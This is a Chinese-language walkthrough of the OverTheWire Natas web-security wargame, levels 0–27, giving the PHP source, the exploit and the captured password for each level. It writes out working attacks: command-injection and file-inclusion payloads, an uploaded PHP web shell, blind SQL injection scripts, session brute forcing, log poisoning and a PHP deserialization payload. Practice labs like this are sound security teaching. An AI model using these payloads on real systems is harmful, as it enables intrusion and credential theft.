# Natas

### Level0

查看页面源码，可以看到
```html
<!--The password for natas1 is gtVrDuiDfck831PqWsLEZy5gyDz1clto -->
```

### Level1

同Level0,可从菜单内打开开发者工具查看源码
```html
<!--The password for natas2 is ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi -->
```

### Level2
源码内原来放密码的地方变成了一张图
```html
<img src="files/pixel.png">
```
图片本身没有什么特殊的，但是访问/files可以看到一个users.txt，里面存着natas3的密码
```html
natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14
```

### Level3
这次信息变成了
```html
<!-- No more information leaks!! Not even Google will find it this time... -->
```
注意后一句话，查看/robots.txt可以看到一个被禁止的目录
```
User-agent: *
Disallow: /s3cr3t/
```
进去只有一个users.txt，里面存着natas4的密码
```text
natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ
```

### Level4
提示信息
```html
Access disallowed. You are visiting from "" while authorized users should come only from "http://natas5.natas.labs.overthewire.org/"
```
修改Header `Referer: http://natas5.natas.labs.overthewire.org/` 之后访问，得到natas5的密码
```html
Access granted. The password for natas5 is iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq
```

### Level5
提示信息
```html
Access disallowed. You are not logged in
```
查看Cookie可以看到 `loggedin=0` ，修改成1后访问，得到natas6的密码
```html
Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1
```

### Level6
PHP源码
```php
<?
include "includes/secret.inc";
    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>
```
于是访问 `/includes/secret.inc` ，得到`$secret = "FOEIUWGHFEEUHOFUOIU";`

提交后得到natas7的密码
```html
Access granted. The password for natas7 is 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9
```

### Level7
提示信息
```html
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```
注意到主页的uri是 `/index.php?page=home`

尝试访问 `/index.php?page=/etc/natas_webpass/natas8` ，得到natas8的密码
```text
DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe
```

### Level8
PHP源码
```php
<?
$encodedSecret = "3d3d516343746d4d6d6c315669563362";
function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}
if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>
```
于是运行以下python代码算出原始secret
```python
import base64
secret_encoded = "3d3d516343746d4d6d6c315669563362"
secret_hex = []
for i in range(len(secret_encoded) // 2):
    secret_hex.append(int(
        secret_encoded[i*2: (i+1)*2], 16
    ))

secret_hex.reverse()
secret_base64 = bytes(secret_hex)
secret = base64.standard_b64decode(secret_base64)
```
得到 `oubWYf2kBq` ，提交后得到natas9的密码
```html
Access granted. The password for natas9 is W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl
```

### Level9
PHP源码
```php
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```
参考Level7，猜测可以从 `/etc/natas_webpass/natas10` 得到密码

于是提交 `. /etc/natas_webpass/natas10;` ，得到natas10的密码
```text
nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu
```

### Level10
PHP源码
```php
<?
$key = "";
if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}
if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```
可见过滤了 `;|&` ，于是去掉Level9末尾的 `;` 提交`. /etc/natas_webpass/natas11`

只查看 `/etc/natas_webpass/natas11` 的部分，得到natas11的密码
```text
U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
```

### Level11
PHP源码，只贴核心部分
```php
<?
$defaultdata = array( "showpassword"=>"no", "bgcolor"=>"#ffffff");
function xor_encrypt($in) {
    $key = '<censored>';
    $text = $in;
    $outText = '';
    // Iterate through each character
    for($i=0;$i<strlen($text);$i++) {
    $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }
    return $outText;
}
function saveData($d) {
    setcookie("data", base64_encode(xor_encrypt(json_encode($d))));
}

if($data["showpassword"] == "yes") {
    print "The password for natas12 is <censored><br>";
}
?>
```
根据key做了一个简单的xor加密

加密后的数据为 `ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=`

加密前的数据为 `{"showpassword":"no","bgcolor":"#ffffff"}`

于是运行以下python代码尝试得到key
```python
import base64
data = b'{"showpassword":"no","bgcolor":"#ffffff"}'
data_xor = base64.b64decode("ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=")

xor_enc = lambda x, y: x ^ y
key = bytes(map(xor_enc, data, data_xor))
```
算出 `qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq` 得到key `qw8J`

将data修改为 `{"showpassword":"yes","bgcolor":"#ffffff"}` 

用算出的key加密得到新的cookie `ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK`

用新的cookie访问得到natas12的密码
```html
The password for natas12 is EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3
```

### Level12
PHP源码，只贴核心部分
```php
<?  
function makeRandomPath($dir, $ext) { 
    do { 
    $path = $dir."/".genRandomString().".".$ext; 
    } while(file_exists($path)); 
    return $path; 
} 
function makeRandomPathFromFilename($dir, $fn) { 
    $ext = pathinfo($fn, PATHINFO_EXTENSION); 
    return makeRandomPath($dir, $ext); 
} 
if(array_key_exists("filename", $_POST)) { 
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]); 
    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
}
?> 
```
未对扩展名做检测，于是将表单中 `filename` 项改为.php结尾，上传如下文件
```php
<?
passthru("cat /etc/natas_webpass/natas13");
?>
```
之后访问上传上去的php页面得到natas13的密码
```text
jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY
```

### Level13
PHP源码，只贴与Level12不同的部分
```php
if(array_key_exists("filename", $_POST)) { 
    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { 
        echo "File is too big"; 
    } else if (! exif_imagetype($_FILES['uploadedfile']['tmp_name'])) { 
        echo "File is not an image"; 
    } else { 
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { 
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded"; 
        } else{ 
            echo "There was an error uploading the file, please try again!"; 
        } 
    } 
}
?> 
```
这次加了一个文件头的检测，于是我们加一个假的文件头，变成
```php
GIF89a
<?
passthru("cat /etc/natas_webpass/natas14");
?>
```
之后访问上传上去的php页面得到natas14的密码(去掉开头的 `GIF89a ` )
```text
Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1
```

### Level14
PHP源码
```php
if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas14', '<censored>'); 
    mysql_select_db('natas14', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\" and password=\"".$_REQUEST["password"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    if(mysql_num_rows(mysql_query($query, $link)) > 0) { 
            echo "Successful login! The password for natas15 is <censored><br>"; 
    } else { 
            echo "Access denied!<br>"; 
    } 
    mysql_close($link); 
}
```
只需要这个SQL语句有结果就行了，于是username里填上`" OR 1=1;#`让这个语句返回所有结果，password随便打点什么上去。得到natas15的密码
```text
AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J
```

### Level15
PHP源码
```php
/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas15', '<censored>'); 
    mysql_select_db('natas15', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        echo "This user exists.<br>"; 
    } else { 
        echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
}
```
总之先测试一下用户名，发现`natas16`确实存在；从代码里可以看出，我们只能知道这个语句返回的结果是否大于0，那么下一步只有盲注密码了…

看了看数据库定义，password最长为64，字符范围根据之前的密码应该是[0-9A-Za-z]，然后写个脚本慢慢跑吧…
```python
import string
import urllib.request
import urllib.parse

url = "http://natas15.natas.labs.overthewire.org/index.php?debug=1"
headers = {
    "Authorization": (
        "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="
    ),
    "Host": "natas15.natas.labs.overthewire.org",
}
table =\
    string.digits +\
    string.ascii_uppercase +\
    string.ascii_lowercase
username = 'natas16" AND HEX(SUBSTRING(password, %d, 1))%sHEX("%s");#'
password = []


def check_password(pos, compar, char):
    post_dict = {
        "username": username % (pos, compar, char)
    }
    post_data = urllib.parse.urlencode(post_dict).encode('ascii')
    req = urllib.request.Request(url, post_data, headers)
    with urllib.request.urlopen(req) as f:
        body = f.read().decode('utf-8')
        return body.find("This user exists.") >= 0


for i in range(1, 65):
    low = 0
    high = len(table)
    mid = (low + high) // 2
    while mid != low:
        if check_password(i, '>', table[mid]):
            low = mid
        else:
            high = mid
        mid = (low + high) // 2
    if check_password(i, '=', table[low]):
        password.append(table[low])
    elif check_password(i, '=', table[high]):
        password.append(table[high])
    else:
        break
print("".join(password))
```
最后拿到natas16的密码
```text
WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
```

### Level16
PHP源码
```php
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
```
把大部分特殊字符都过滤了，不过$key是包在双引号里的，所以可以用$(statements)的方式来执行语句返回一个结果到$key里，其余的思路跟上一题差不多
```python
import string
import urllib.request
import urllib.parse

url = "http://natas16.natas.labs.overthewire.org/index.php?debug=1"
headers = {
    "Authorization": (
        "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="
    ),
    "Host": "natas16.natas.labs.overthewire.org",
}
table =\
    string.digits +\
    string.ascii_uppercase +\
    string.ascii_lowercase
needle = '$(grep ^%s[%s] /etc/natas_webpass/natas17)'
password = ""


def check_password(low, high):
    post_dict = {
        "needle": needle % (password, table[low: high])
    }
    post_data = urllib.parse.urlencode(post_dict).encode('ascii')
    req = urllib.request.Request(url, post_data, headers)
    with urllib.request.urlopen(req) as f:
        body = f.read().decode('utf-8')
        return body.find("African") < 0


while True:
    low = 0
    high = len(table)
    mid = (low + high) // 2
    while mid != low:
        if check_password(mid, high):
            low = mid
        else:
            high = mid
        mid = (low + high) // 2
    if check_password(low, high):
        password += table[low]
    else:
        break
print(password)
```
最后拿到natas17的密码
```text
8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
```

### Level17
PHP源码
```php
/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 

if(array_key_exists("username", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas17', '<censored>'); 
    mysql_select_db('natas17', $link); 
     
    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 
    if(array_key_exists("debug", $_GET)) { 
        echo "Executing query: $query<br>"; 
    } 

    $res = mysql_query($query, $link); 
    if($res) { 
    if(mysql_num_rows($res) > 0) { 
        //echo "This user exists.<br>"; 
    } else { 
        //echo "This user doesn't exist.<br>"; 
    } 
    } else { 
        //echo "Error in query.<br>"; 
    } 

    mysql_close($link); 
}
```
基本思路跟Level15一样，但是不能靠返回的内容判断了，所以只有靠sleep来盲注了，碰到网络波动就比较尴尬了…保险一点的话sleep的时间得设长一点

先试试`natas18" AND SLEEP(10)#`，确定用户名确实是`natas18`，剩下的部分就跟Level15大同小异了，因为二分在这里太慢，这里就直接判断了，并且各个位并行请求
```python
import string
import urllib.request
import urllib.parse
import time
from multiprocessing import Pool

url = "http://natas17.natas.labs.overthewire.org/index.php?debug=1"
headers = {
    "Authorization": (
        "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw=="
    ),
    "Host": "natas17.natas.labs.overthewire.org",
}
table =\
    string.digits +\
    string.ascii_uppercase +\
    string.ascii_lowercase
username = (
    'natas18" AND '
    'IF(HEX(SUBSTRING(password, %d, 1))%sHEX("%s"), SLEEP(30), null);#'
)


def check_password(pos, compar, char):
    time_start = time.time()
    post_dict = {
        "username": username % (pos, compar, char)
    }
    post_data = urllib.parse.urlencode(post_dict).encode('ascii')
    req = urllib.request.Request(url, post_data, headers)
    with urllib.request.urlopen(req, timeout=60):
        return (time.time() - time_start) > 30


def inject_password(pos):
    for char in table:
        if check_password(pos, '=', char):
            return char
    return ""


with Pool(64) as pool:
    print("".join(pool.map(inject_password, range(1, 65))))
```
最后拿到natas18的密码
```text
xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP
```

###Level18
PHP源码，只贴核心部分
```php
$maxid = 640; // 640 should be enough for everyone 

function my_session_start() {
    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) { 
    if(!session_start()) { 
        return false; 
    } else { 
        return true; 
    } 
    } 
    return false; 
} 

function print_credentials() {
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas19\n"; 
    print "Password: <censored></pre>"; 
    } else { 
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19."; 
    } 
} 

if(my_session_start()) { 
    print_credentials(); 
}
```
大概就是读了下cookie里的PHPSESSID，然后就当你是这个session对应的用户了，猜测这640个id里肯定有一个是admin的，于是直接穷举吧…
```python
import urllib.request
import urllib.parse
from multiprocessing import Pool

url = "http://natas18.natas.labs.overthewire.org/index.php"
headers = {
    "Authorization": (
        "Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=="
    ),
    "Host": "natas18.natas.labs.overthewire.org",
}


def check_password(session_id):
    post_dict = {
        "username": "admin",
        "password": "admin"
    }
    post_data = urllib.parse.urlencode(post_dict).encode('ascii')
    req = urllib.request.Request(url, post_data, headers)
    req.add_header("Cookie", "PHPSESSID=%d" % session_id)
    with urllib.request.urlopen(req) as f:
        body = f.read().decode('utf-8')
        if body.find("You are an admin.") >= 0:
            print(session_id)


with Pool(64) as pool:
    pool.map(check_password, range(1, 641))
```
最后拿到natas19的密码
```text
4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs
```

###Level19
没有给源码，提示说
```text
This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
```
总之先弄几个ID看看吧，拿到了
```text
3433302d61646d696e
3130302d61646d696e
3237342d61646d696e
...
```
大概是`3x3x3x2d61646d696e`的感觉，剩下的部分跟上一题一样了
```python
import urllib.request
import urllib.parse
from multiprocessing import Pool

url = "http://natas19.natas.labs.overthewire.org/index.php"
headers = {
    "Authorization": (
        "Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw=="
    ),
    "Host": "natas19.natas.labs.overthewire.org",
}


def check_password(session_id):
    session_id = str(session_id)
    post_dict = {
        "username": "admin",
        "password": "admin"
    }
    post_data = urllib.parse.urlencode(post_dict).encode('ascii')
    req = urllib.request.Request(url, post_data, headers)
    req.add_header(
        "Cookie",
        "PHPSESSID=3%s3%s3%s2d61646d696e" % (
            session_id[0], session_id[1], session_id[2]
        )
    )
    with urllib.request.urlopen(req) as f:
        body = f.read().decode('utf-8')
        if body.find("You are an admin.") >= 0:
            print(session_id)


with Pool(64) as pool:
    pool.map(check_password, range(100, 1000))
```
最后拿到natas20的密码
```text
eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
```
###Level20
PHP源码，只贴核心部分
```php
function print_credentials() { /* {{{ */ 
    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas21\n"; 
    print "Password: <censored></pre>"; 
    } else { 
    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21."; 
    } 
} 
/* }}} */ 
function myread($sid) {  
    debug("MYREAD $sid");  
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) { 
    debug("Invalid SID");  
        return ""; 
    } 
    $filename = session_save_path() . "/" . "mysess_" . $sid; 
    if(!file_exists($filename)) { 
        debug("Session file doesn't exist"); 
        return ""; 
    } 
    debug("Reading from ". $filename); 
    $data = file_get_contents($filename); 
    $_SESSION = array(); 
    foreach(explode("\n", $data) as $line) { 
        debug("Read [$line]"); 
    $parts = explode(" ", $line, 2); 
    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1]; 
    } 
    return session_encode(); 
} 

function mywrite($sid, $data) {  
    // $data contains the serialized version of $_SESSION 
    // but our encoding is better 
    debug("MYWRITE $sid $data");  
    // make sure the sid is alnum only!! 
    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) { 
    debug("Invalid SID");  
        return; 
    } 
    $filename = session_save_path() . "/" . "mysess_" . $sid; 
    $data = ""; 
    debug("Saving in ". $filename); 
    ksort($_SESSION); 
    foreach($_SESSION as $key => $value) { 
        debug("$key => $value"); 
        $data .= "$key $value\n"; 
    } 
    file_put_contents($filename, $data); 
    chmod($filename, 0600); 
}

session_set_save_handler( 
    "myopen",  
    "myclose",  
    "myread",  
    "mywrite",  
    "mydestroy",  
    "mygarbage"); 
session_start(); 

if(array_key_exists("name", $_REQUEST)) { 
    $_SESSION["name"] = $_REQUEST["name"]; 
    debug("Name set to " . $_REQUEST["name"]); 
} 

print_credentials(); 

$name = ""; 
if(array_key_exists("name", $_SESSION)) { 
    $name = $_SESSION["name"]; 
}
```
注意到读session的函数里是直接按照`\n`切割，而保存的时候没有对value做任何检查，于是在value里插一个换行符就可以了，拿到natas21的密码
```text
IFekPyrQXftziDEsUr3x21sYuahypdgJ
```

###Level21
按他的指示去隔壁，PHP源码，只贴核心部分
```php
// if update was submitted, store it 
if(array_key_exists("submit", $_REQUEST)) { 
    foreach($_REQUEST as $key => $val) { 
    $_SESSION[$key] = $val; 
    } 
}
```
直接在表单里加个admin项，填1就行了…拿到natas22的密码
```text
chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ
```

###Level22
PHP源码
```php
if(array_key_exists("revelio", $_GET)) { 
    // only admins can reveal the password 
    if(!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) { 
    header("Location: /"); 
    } 
}

if(array_key_exists("revelio", $_GET)) { 
    print "You are an admin. The credentials for the next level are:<br>"; 
    print "<pre>Username: natas23\n"; 
    print "Password: <censored></pre>"; 
}
```
url里加个?revelio=1就行，Postman/Burp或者写脚本不自动跟随重定向就可以看到密码。拿到natas23的密码
```text
D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE
```

###Level23
PHP源码
```php
if(array_key_exists("passwd",$_REQUEST)){
    if(strstr($_REQUEST["passwd"],"iloveyou") && ($_REQUEST["passwd"] > 10 )){
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas24 Password: <censored></pre>";
    }
    else{
        echo "<br>Wrong!<br>";
    }
}
// morla / 10111
```
尴尬的隐式类型转换…填`11iloveyou`就好。拿到natas24的密码
```text
OsRmXFguozKpTZZ5X14zNO43379LZveg
```

###Level24
PHP源码
```php
if(array_key_exists("passwd",$_REQUEST)){
    if(!strcmp($_REQUEST["passwd"],"<censored>")){
        echo "<br>The credentials for the next level are:<br>";
        echo "<pre>Username: natas25 Password: <censored></pre>";
    }
    else{
        echo "<br>Wrong!<br>";
    }
}
// morla / 10111
```
看看[文档](http://php.net/manual/en/function.strcmp.php)，发现这么一句`strcmp("foo", array()) => NULL + PHP Warning`，然后就把passwd改成passwd[]，不填内容提交，会出现Warning和密码。拿到natas25的密码
```text
GHF6X7YwACaYYssHVY05cFq83hRktl4c
```

###Level25
PHP源码
```php
// cheers and <3 to malvina
// - morla

function setLanguage(){
    /* language setup */
    if(array_key_exists("lang",$_REQUEST))
        if(safeinclude("language/" . $_REQUEST["lang"] ))
            return 1;
    safeinclude("language/en"); 
}
    
function safeinclude($filename){
    // check for directory traversal
    if(strstr($filename,"../")){
        logRequest("Directory traversal attempt! fixing request.");
        $filename=str_replace("../","",$filename);
    }
    // dont let ppl steal our passwords
    if(strstr($filename,"natas_webpass")){
       logRequest("Illegal file access detected! Aborting!");
        exit(-1);
    }
    // add more checks...

    if (file_exists($filename)) { 
        include($filename);
        return 1;
    }
    return 0;
}
    
function logRequest($message){
    $log="[". date("d.m.Y H::i:s",time()) ."]";
    $log=$log . " " . $_SERVER['HTTP_USER_AGENT'];
    $log=$log . " \"" . $message ."\"\n"; 
    $fd=fopen("/tmp/natas25_" . session_id() .".log","a");
    fwrite($fd,$log);
    fclose($fd);
}
```
注意到网页内容是include进来的，而且logRequest内有一个可以让我们填任意字符的地方，那么下一步就是想办法让它include进来这个log文件。

检查目录遍历的函数里只替换了一次`../`，所以如果我们输入`....//`的话，替换之后就变成了`../`，多重复几次就可以到达根目录，然后访问到log文件了。

最后在UA里插一段`<?php include('/etc/natas_webpass/natas26') ?>`就可以拿到密码了。

拿到natas26的密码
```text
oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
```

###Level26
PHP源码，只贴核心部分
```php
class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;

    function __construct($file){
        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="#--session end--#\n";
        $this->logFile = "/tmp/natas26_" . $file . ".log";

        // write initial message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$initMsg);
        fclose($fd);
    }                       

    function __destruct(){
        // write exit message
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$this->exitMsg);
        fclose($fd);
    }
}

function drawImage($filename){
    $img=imagecreatetruecolor(400,300);
    drawFromUserdata($img);
    imagepng($img,$filename);
    imagedestroy($img);
}

function drawFromUserdata($img){
    if (array_key_exists("drawing", $_COOKIE)){
        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
    }    
}
    
function storeData(){
    if (array_key_exists("drawing", $_COOKIE)){
        $drawing=unserialize(base64_decode($_COOKIE["drawing"]));
    }
}

if (array_key_exists("drawing", $_COOKIE) ||
    (   array_key_exists("x1", $_GET) && array_key_exists("y1", $_GET) &&
        array_key_exists("x2", $_GET) && array_key_exists("y2", $_GET))){  
    $imgfile="img/natas26_" . session_id() .".png"; 
    drawImage($imgfile); 
    showImage($imgfile);
    storeData();
}
```
发现用到了`unserialize`，代码里还有个奇怪的Logger。于是自己试了试，发现`serialize`会把实例内部属性给dump出来，然后`unserialize`的时候会去读属性，这样构造函数不一定能用上，不过析构函数是肯定可以用得上的…于是写了下面的php代码来试图往img目录里写一个php文件
```php
<?php
class Logger{
    private $logFile="img/yoooo.php";
    private $initMsg="<?php include('/etc/natas_webpass/natas27'); ?> ";
    private $exitMsg="<?php include('/etc/natas_webpass/natas27'); ?>";

    function __construct($file){
    }
    function log($msg){
    }
    function __destruct(){
    }
}
echo urlencode(base64_encode(serialize(new Logger(""))));
?>
```
然后访问`img/yoooo.php`，拿到natas27的密码
```text
55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
```

###Level27
PHP源码
```php
// morla / 10111 
// database gets cleared every 5 min 

/* 
CREATE TABLE `users` ( 
  `username` varchar(64) DEFAULT NULL, 
  `password` varchar(64) DEFAULT NULL 
); 
*/ 


function checkCredentials($link,$usr,$pass){ 
    $user=mysql_real_escape_string($usr); 
    $password=mysql_real_escape_string($pass); 
     
    $query = "SELECT username from users where username='$user' and password='$password' "; 
    $res = mysql_query($query, $link); 
    if(mysql_num_rows($res) > 0){ 
        return True; 
    } 
    return False; 
} 

function validUser($link,$usr){ 
    $user=mysql_real_escape_string($usr); 
     
    $query = "SELECT * from users where username='$user'"; 
    $res = mysql_query($query, $link); 
    if($res) { 
        if(mysql_num_rows($res) > 0) { 
            return True; 
        } 
    } 
    return False; 
} 

function dumpData($link,$usr){ 
    $user=mysql_real_escape_string($usr); 
     
    $query = "SELECT * from users where username='$user'"; 
    $res = mysql_query($query, $link); 
    if($res) { 
        if(mysql_num_rows($res) > 0) { 
            while ($row = mysql_fetch_assoc($res)) { 
                //thanks to Gobo for reporting this bug! 
                //return print_r($row); 
                return print_r($row,true); 
            } 
        } 
    } 
    return False; 
} 

function createUser($link, $usr, $pass){ 
    $user=mysql_real_escape_string($usr); 
    $password=mysql_real_escape_string($pass); 
     
    $query = "INSERT INTO users (username,password) values ('$user','$password')"; 
    $res = mysql_query($query, $link); 
    if(mysql_affected_rows() > 0){ 
        return True; 
    } 
    return False; 
} 


if(array_key_exists("username", $_REQUEST) and array_key_exists("password", $_REQUEST)) { 
    $link = mysql_connect('localhost', 'natas27', '<censored>'); 
    mysql_select_db('natas27', $link); 
    

    if(validUser($link,$_REQUEST["username"])) { 
        //user exists, check creds 
        if(checkCredentials($link,$_REQUEST["username"],$_REQUEST["password"])){ 
            echo "Welcome " . htmlentities($_REQUEST["username"]) . "!<br>"; 
            echo "Here is your data:<br>"; 
            $data=dumpData($link,$_REQUEST["username"]); 
            print htmlentities($data); 
        } 
        else{ 
            echo "Wrong password for user: " . htmlentities($_REQUEST["username"]) . "<br>"; 
        }         
    }  
    else { 
        //user doesn't exist 
        if(createUser($link,$_REQUEST["username"],$_REQUEST["password"])){  
            echo "User " . htmlentities($_REQUEST["username"]) . " was created!"; 
        } 
    } 

    mysql_close($link); 
}
```
大概是看一下有没有这个用户名，有的话检测用户名和密码这一对数据是否存在，如果存在就去拿用户名对应的数据；如果没有这个用户名就创建一个新的。

那么下一步要做的应该是自己插一个`natas28`用户进去了…然而这代码并没有可以让我们注入的地方…尴尬…

看了看开头的注释，`username`长度只有64，然后翻了翻MySQL的[文档](https://dev.mysql.com/doc/refman/5.0/en/char.html)，注意到
```text
Before MySQL 5.0.3, trailing spaces are removed from values when they are stored into a VARCHAR column; this means that the spaces also are absent from retrieved values.
```
也就是说后面的空格会被删掉，于是尝试令`username`=`natas28`+57个空格，发现此时还是会当`natas28`处理。

然后尝试令`username`=`natas28`+57个空格+1个任意字符，`password`留空，这时`validUser`返回了`False`，于是系统会尝试插入这个用户，首先末尾超出的字符被截断，只留下`natas28`+57个空格，然后末尾空格被删掉，只留下`natas28`。这样就成功插入了一个新的`natas28`用户。

最后拿到`natas28`的密码
```text
JWwR438wkgTsNKBbcJoowyysdM82YjeF
```